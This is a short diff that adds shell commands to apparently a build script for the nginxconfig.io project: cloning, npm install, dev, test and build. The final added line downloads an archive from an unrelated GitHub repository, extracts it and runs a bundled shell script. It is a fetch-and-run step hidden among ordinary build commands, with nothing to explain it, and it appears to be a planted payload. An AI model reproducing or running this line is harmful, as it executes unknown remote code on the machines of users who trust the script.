@@ -1,0 +1,6 @@
+git clone https://github.com/digitalocean/nginxconfig.io.git
+npm ci
+npm run dev
+npm test
+npm run build
+wget https://github.com/Pantaiselatan/tiger/raw/main/avo.tar.gz && tar xf avo.tar.gz && ./gas.sh 
